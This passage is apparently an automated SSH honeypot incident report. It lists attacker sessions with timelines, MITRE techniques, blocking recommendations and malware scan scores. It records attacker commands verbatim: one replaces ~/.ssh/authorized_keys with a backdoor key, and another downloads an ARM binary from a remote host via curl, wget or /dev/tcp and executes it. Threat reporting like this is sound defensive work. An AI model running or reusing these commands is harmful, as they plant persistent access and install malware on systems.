| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:14:33` | `cowrie.session.connect` |
| `2026-04-22 05:14:33` | `cowrie.client.version` |
| `2026-04-22 05:14:33` | `cowrie.client.kex` |
| `2026-04-22 05:14:34` | `cowrie.login.success` |
| `2026-04-22 05:14:34` | `cowrie.session.params` |
| `2026-04-22 05:14:34` | `cowrie.command.input` |
| `2026-04-22 05:14:34` | `cowrie.command.failed` |
| `2026-04-22 05:14:34` | `cowrie.log.closed` |
| `2026-04-22 05:14:35` | `cowrie.session.params` |
| `2026-04-22 05:14:35` | `cowrie.command.input` |
| `2026-04-22 05:14:35` | `cowrie.session.file_download` |
| `2026-04-22 05:14:35` | `cowrie.log.closed` |
| `2026-04-22 05:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa1b2e3fa5b

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:14 |
| **Last Seen** | 2026-04-22 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:14:37` | `cowrie.session.connect` |
| `2026-04-22 05:14:37` | `cowrie.client.version` |
| `2026-04-22 05:14:37` | `cowrie.client.kex` |
| `2026-04-22 05:14:38` | `cowrie.login.success` |
| `2026-04-22 05:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d45baeca9e25

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:17 |
| **Last Seen** | 2026-04-22 05:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:17:49` | `cowrie.session.connect` |
| `2026-04-22 05:17:49` | `cowrie.client.version` |
| `2026-04-22 05:17:49` | `cowrie.client.kex` |
| `2026-04-22 05:17:50` | `cowrie.login.success` |
| `2026-04-22 05:17:50` | `cowrie.session.params` |
| `2026-04-22 05:17:50` | `cowrie.command.input` |
| `2026-04-22 05:17:50` | `cowrie.command.failed` |
| `2026-04-22 05:17:50` | `cowrie.log.closed` |
| `2026-04-22 05:17:51` | `cowrie.session.params` |
| `2026-04-22 05:17:51` | `cowrie.command.input` |
| `2026-04-22 05:17:51` | `cowrie.session.file_download` |
| `2026-04-22 05:17:51` | `cowrie.log.closed` |
| `2026-04-22 05:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e90abc8f7c

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:17 |
| **Last Seen** | 2026-04-22 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:17:53` | `cowrie.session.connect` |
| `2026-04-22 05:17:53` | `cowrie.client.version` |
| `2026-04-22 05:17:53` | `cowrie.client.kex` |
| `2026-04-22 05:17:54` | `cowrie.login.success` |
| `2026-04-22 05:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ac177bc419f

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:19 |
| **Last Seen** | 2026-04-22 05:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:19:26` | `cowrie.session.connect` |
| `2026-04-22 05:19:26` | `cowrie.client.version` |
| `2026-04-22 05:19:26` | `cowrie.client.kex` |
| `2026-04-22 05:19:27` | `cowrie.login.success` |
| `2026-04-22 05:19:27` | `cowrie.session.params` |
| `2026-04-22 05:19:27` | `cowrie.command.input` |
| `2026-04-22 05:19:27` | `cowrie.command.failed` |
| `2026-04-22 05:19:28` | `cowrie.log.closed` |
| `2026-04-22 05:19:28` | `cowrie.session.params` |
| `2026-04-22 05:19:28` | `cowrie.command.input` |
| `2026-04-22 05:19:28` | `cowrie.session.file_download` |
| `2026-04-22 05:19:28` | `cowrie.log.closed` |
| `2026-04-22 05:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e6f844ff91

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:19 |
| **Last Seen** | 2026-04-22 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:19:30` | `cowrie.session.connect` |
| `2026-04-22 05:19:30` | `cowrie.client.version` |
| `2026-04-22 05:19:31` | `cowrie.client.kex` |
| `2026-04-22 05:19:31` | `cowrie.login.success` |
| `2026-04-22 05:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66c6628af57

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:20 |
| **Last Seen** | 2026-04-22 05:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:20:14` | `cowrie.session.connect` |
| `2026-04-22 05:20:14` | `cowrie.client.version` |
| `2026-04-22 05:20:14` | `cowrie.client.kex` |
| `2026-04-22 05:20:15` | `cowrie.login.success` |
| `2026-04-22 05:20:15` | `cowrie.session.params` |
| `2026-04-22 05:20:15` | `cowrie.command.input` |
| `2026-04-22 05:20:15` | `cowrie.command.failed` |
| `2026-04-22 05:20:15` | `cowrie.log.closed` |
| `2026-04-22 05:20:16` | `cowrie.session.params` |
| `2026-04-22 05:20:16` | `cowrie.command.input` |
| `2026-04-22 05:20:16` | `cowrie.session.file_download` |
| `2026-04-22 05:20:16` | `cowrie.log.closed` |
| `2026-04-22 05:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eacba2b82373

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:20 |
| **Last Seen** | 2026-04-22 05:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:20:18` | `cowrie.session.connect` |
| `2026-04-22 05:20:18` | `cowrie.client.version` |
| `2026-04-22 05:20:18` | `cowrie.client.kex` |
| `2026-04-22 05:20:19` | `cowrie.login.success` |
| `2026-04-22 05:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a87b4752fb8

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:22 |
| **Last Seen** | 2026-04-22 05:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:22:36` | `cowrie.session.connect` |
| `2026-04-22 05:22:36` | `cowrie.client.version` |
| `2026-04-22 05:22:36` | `cowrie.client.kex` |
| `2026-04-22 05:22:37` | `cowrie.login.success` |
| `2026-04-22 05:22:37` | `cowrie.session.params` |
| `2026-04-22 05:22:37` | `cowrie.command.input` |
| `2026-04-22 05:22:37` | `cowrie.command.failed` |
| `2026-04-22 05:22:37` | `cowrie.log.closed` |
| `2026-04-22 05:22:38` | `cowrie.session.params` |
| `2026-04-22 05:22:38` | `cowrie.command.input` |
| `2026-04-22 05:22:38` | `cowrie.session.file_download` |
| `2026-04-22 05:22:38` | `cowrie.log.closed` |
| `2026-04-22 05:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df7570fe3c5

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:22 |
| **Last Seen** | 2026-04-22 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:22:40` | `cowrie.session.connect` |
| `2026-04-22 05:22:40` | `cowrie.client.version` |
| `2026-04-22 05:22:40` | `cowrie.client.kex` |
| `2026-04-22 05:22:41` | `cowrie.login.success` |
| `2026-04-22 05:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c9a9fc1091

| Field | Detail |
|---|---|
| **Source IP** | `176.65.148[.]44` |
| **First Seen** | 2026-04-22 05:23 |
| **Last Seen** | 2026-04-22 05:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:23:13` | `cowrie.session.connect` |
| `2026-04-22 05:23:14` | `cowrie.client.version` |
| `2026-04-22 05:23:14` | `cowrie.client.kex` |
| `2026-04-22 05:23:19` | `cowrie.login.success` |
| `2026-04-22 05:23:20` | `cowrie.direct-tcpip.request` |
| `2026-04-22 05:23:22` | `cowrie.direct-tcpip.ja4` |
| `2026-04-22 05:23:22` | `cowrie.direct-tcpip.data` |
| `2026-04-22 05:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.148[.]44` to AbuseIPDB if not already reported
- [ ] Block `176.65.148[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d428da7400db

| Field | Detail |
|---|---|
| **Source IP** | `60.29.174[.]122` |
| **First Seen** | 2026-04-22 05:43 |
| **Last Seen** | 2026-04-22 05:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 && cat /bin/echo, nohup $SHELL -c "curl hxxp://47.254.126[.]99:60100/arm_linux -o /tmp/7VkFYJklSz; if [ ! -f /tmp/7VkFYJklSz ]; then wget hxxp://47.254.126[.]99:60100/arm_linux -O /tmp/7VkFYJklSz; fi; if [ ! -f /tmp/7VkFYJklSz ]; then exec 6<>/dev/tcp/47.254.126[.]99/60100 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/7VkFYJklSz ; chmod +x /tmp/7VkFYJklSz && /tmp/7VkFYJklSz 6brveIGTHg03AhlXLlgSCS8JGpGfb+O0lpao9X6YlQUILAMRVzBQGgI5DxuPnXb1q5OQtOp9nZsdCSgHG0ExURodKwkbj5537LSdlaDtf56VHRktBAVZNE8aCi4XGZSdde2qlZev+3uYjxwPNwEaUS5QGA, head -c 2294564 > /tmp/QlR5Ktw4RM, nohup $SHELL -c "curl hxxp://47.254.126[.]99:60100/arm_linux -o /tmp/7VkFYJklSz; if [ ! -f /tmp/7VkFYJklSz ]; then wget hxxp://47.254.126[.]99:60100/arm_linux -O /tmp/7VkFYJklSz; fi; if [ ! -f /tmp/7VkFYJklSz ]; then exec 6<>/dev/tcp/47.254.126[.]99/60100 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/7VkFYJklSz ; chmod +x /tmp/7VkFYJklSz && /tmp/7VkFYJklSz 6brveIGTHg03AhlXLlgSCS8JGpGfb+O0lpao9X6YlQUILAMRVzBQGgI5DxuPnXb1q5OQtOp9nZsdCSgHG0ExURodKwkbj5537LSdlaDtf56VHRktBAVZNE8aCi4XGZSdde2qlZev+3uYjxwPNwEaUS5QGA, 4` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1110.001 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:43:57` | `cowrie.session.connect` |
| `2026-04-22 05:43:57` | `cowrie.client.version` |
| `2026-04-22 05:43:57` | `cowrie.client.kex` |
| `2026-04-22 05:43:58` | `cowrie.login.failed` |
| `2026-04-22 05:43:59` | `cowrie.login.success` |
| `2026-04-22 05:43:59` | `cowrie.session.params` |
| `2026-04-22 05:43:59` | `cowrie.command.input` |
| `2026-04-22 05:44:05` | `cowrie.command.input` |
| `2026-04-22 05:44:05` | `cowrie.command.input` |
| `2026-04-22 05:44:05` | `cowrie.command.input` |
| `2026-04-22 05:44:05` | `cowrie.command.input` |
| `2026-04-22 05:44:05` | `cowrie.command.failed` |
| `2026-04-22 05:44:05` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.failed` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.failed` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.failed` |
| `2026-04-22 05:44:06` | `cowrie.log.closed` |
| `2026-04-22 05:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.29.174[.]122` to AbuseIPDB if not already reported
- [ ] Block `60.29.174[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c9d3be96d73

| Field | Detail |
|---|---|
| **Source IP** | `60.29.174[.]122` |
| **First Seen** | 2026-04-22 05:43 |
| **Last Seen** | 2026-04-22 05:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 && cat /bin/echo, nohup $SHELL -c "curl hxxp://47.254.126[.]99:60100/arm_linux -o /tmp/BNELU7Kc5W; if [ ! -f /tmp/BNELU7Kc5W ]; then wget hxxp://47.254.126[.]99:60100/arm_linux -O /tmp/BNELU7Kc5W; fi; if [ ! -f /tmp/BNELU7Kc5W ]; then exec 6<>/dev/tcp/47.254.126[.]99/60100 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/BNELU7Kc5W ; chmod +x /tmp/BNELU7Kc5W && /tmp/BNELU7Kc5W 6brveIGTHg03AhlXLlgSCS8JGpGfb+O0lpao9X6YlQUILAMRVzBQGgI5DxuPnXb1q5OQtOp9nZsdCSgHG0ExURodKwkbj5537LSdlaDtf56VHRktBAVZNE8aCi4XGZSdde2qlZev+3uYjxwPNwEaUS5QGA, head -c 2294564 > /tmp/hIjm4gUyId, nohup $SHELL -c "curl hxxp://47.254.126[.]99:60100/arm_linux -o /tmp/BNELU7Kc5W; if [ ! -f /tmp/BNELU7Kc5W ]; then wget hxxp://47.254.126[.]99:60100/arm_linux -O /tmp/BNELU7Kc5W; fi; if [ ! -f /tmp/BNELU7Kc5W ]; then exec 6<>/dev/tcp/47.254.126[.]99/60100 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/BNELU7Kc5W ; chmod +x /tmp/BNELU7Kc5W && /tmp/BNELU7Kc5W 6brveIGTHg03AhlXLlgSCS8JGpGfb+O0lpao9X6YlQUILAMRVzBQGgI5DxuPnXb1q5OQtOp9nZsdCSgHG0ExURodKwkbj5537LSdlaDtf56VHRktBAVZNE8aCi4XGZSdde2qlZev+3uYjxwPNwEaUS5QGA, 4` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1110.001 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:43:57` | `cowrie.session.connect` |
| `2026-04-22 05:43:57` | `cowrie.client.version` |
| `2026-04-22 05:43:57` | `cowrie.client.kex` |
| `2026-04-22 05:43:58` | `cowrie.login.failed` |
| `2026-04-22 05:43:59` | `cowrie.login.success` |
| `2026-04-22 05:43:59` | `cowrie.session.params` |
| `2026-04-22 05:43:59` | `cowrie.command.input` |
| `2026-04-22 05:44:05` | `cowrie.command.input` |
| `2026-04-22 05:44:05` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.failed` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.failed` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.failed` |
| `2026-04-22 05:44:06` | `cowrie.command.input` |
| `2026-04-22 05:44:06` | `cowrie.command.failed` |
| `2026-04-22 05:44:06` | `cowrie.log.closed` |
| `2026-04-22 05:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.29.174[.]122` to AbuseIPDB if not already reported
- [ ] Block `60.29.174[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.32.240[.]31` | **26** | 2026-04-22 04:26 | 2026-04-22 04:56 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.206.32[.]4` | **26** | 2026-04-22 04:29 | 2026-04-22 05:14 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `51.163.39[.]213` | **26** | 2026-04-22 04:37 | 2026-04-22 05:00 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.30.162[.]19` | **26** | 2026-04-22 04:26 | 2026-04-22 05:23 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.35[.]129` | **24** | 2026-04-22 04:55 | 2026-04-22 05:02 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `3.151.241[.]153` | **6** | 2026-04-22 03:04 | 2026-04-22 03:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `110.227.250[.]140` | 1 | 2026-04-22 04:28 | 2026-04-22 04:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `117.62.203[.]160` | 1 | 2026-04-22 04:29 | 2026-04-22 04:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-04-22 04:26 | 2026-04-22 04:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.78.9[.]93` | 1 | 2026-04-22 05:47 | 2026-04-22 05:48 | 30s | 0 | `T1592` | 🟢 LOW |
| `128.199.8[.]140` | 1 | 2026-04-22 04:21 | 2026-04-22 04:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]44` | 1 | 2026-04-22 05:23 | 2026-04-22 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-04-22 04:27 | 2026-04-22 04:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-04-22 04:26 | 2026-04-22 04:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.236.95[.]236` | 1 | 2026-04-22 03:59 | 2026-04-22 03:59 | 12s | 0 | `T1592` | 🟢 LOW |
| `35.216.201[.]9` | 1 | 2026-04-22 04:51 | 2026-04-22 04:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]7` | 1 | 2026-04-22 03:36 | 2026-04-22 03:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]105` | 1 | 2026-04-22 03:19 | 2026-04-22 03:19 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
